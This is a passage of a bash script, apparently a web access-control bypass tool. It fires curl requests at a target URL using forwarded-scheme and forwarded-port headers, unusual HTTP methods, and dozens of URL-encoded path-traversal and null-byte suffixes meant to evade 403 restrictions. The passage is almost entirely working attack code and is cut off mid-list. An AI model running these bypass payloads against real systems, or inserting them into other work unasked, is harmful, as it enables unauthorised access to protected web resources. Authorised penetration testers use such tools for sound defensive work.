echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$VHOST/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$VHOST/$PAT" -H "$user_agent")
print
echo -n "HTTPs Scheme Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$VHOST/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$VHOST/$PAT" -H "$user_agent")
print
echo -n "X-Forwarded-Scheme HTTP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Scheme HTTPs Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent")
print



echo -e ${blue}"-------------------------"${end}
echo -e ${cyan}"[+] Port Based Bypass"${end}
echo -e ${blue}"-------------------------"${end}
echo -n "X-Forwarded-Port 443 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 4443 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 80 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 8080 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 8443 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent")
print


echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] HTTP Method Bypass"${end}
echo -e ${blue}"----------------------"${end}

echo -n "GET : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X GET
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X GET)
print
echo -n "POST : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X POST
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X POST)
print
echo -n "HEAD :"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -I -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -I -H "$user_agent")
print
echo -n "OPTIONS : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X OPTIONS
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X OPTIONS)
print
echo -n "PUT : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X PUT
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X PUT)
print
echo -n "TRACE : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X TRACE
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X TRACE)
print
echo -n "PATCH : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X PATCH
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X PATCH)
print
echo -n "TRACK : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X TRACK
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X TRACK)
print
echo -n "CONNECT : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X CONNECT
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X CONNECT)
print
echo -n "UPDATE : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X UPDATE
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X UPDATE)
print
echo -n "LOCK : "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X LOCK
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -H "$user_agent" -X LOCK)
print


echo -e ${blue}"-----------------------------"${end}
echo -e ${cyan}"[+] URL Tricks Bypass suffix "${end}
echo -e ${blue}"-----------------------------"${end}

echo -n "Payload [ #? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
print
echo -n "Payload [ %09%3b ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent")
print
echo -n "Payload [ %09.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent")
print
echo -n "Payload [ %09; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent")
print
echo -n "Payload [ %20 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent")
print
echo -n "Payload [ %23%3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent")
print
echo -n "Payload [ %252f%252f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent")
print
echo -n "Payload [ %252f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent")
print
echo -n "Payload [ %2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent")
print
echo -n "Payload [ %2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ %2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%20%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent")
print
echo -n "Payload [ %2f%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent")
print
echo -n "Payload [ %2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent")
print
echo -n "Payload [ %2f%3f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent")
print
echo -n "Payload [ %2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent")
print
echo -n "Payload [ %3b ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent")
print
echo -n "Payload [ %3b%09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent")
print
echo -n "Payload [ %3b%2f.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent")
print
echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent")
print
echo -n "Payload [ %3b/%2f%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ %3b/.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent")
print
echo -n "Payload [ %3b//%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent")
print
echo -n "Payload [ %3f%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent")
print
echo -n "Payload [ %3f%3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent")
print
echo -n "Payload [ .. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent")
print
echo -n "Payload [ ..%00/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent")
print
echo -n "Payload [ ..%00;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent")
print
echo -n "Payload [ ..%09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent")
print
echo -n "Payload [ ..%0d/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent")
print
echo -n "Payload [ ..%0d;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent")
print
echo -n "Payload [ ..%5c/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent")
print
echo -n "Payload [ ..%ff/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent")
print
echo -n "Payload [ ..%ff;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent")
print
echo -n "Payload [ ..;%00/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent")
print
echo -n "Payload [ ..;%0d/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent")
print
echo -n "Payload [ ..;%ff/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent")
print
echo -n "Payload [ ..;\ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent")
print
echo -n "Payload [ ..;\; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent")
print
echo -n "Payload [ ..\; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent")
print
echo -n "Payload [ /%20# ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent"
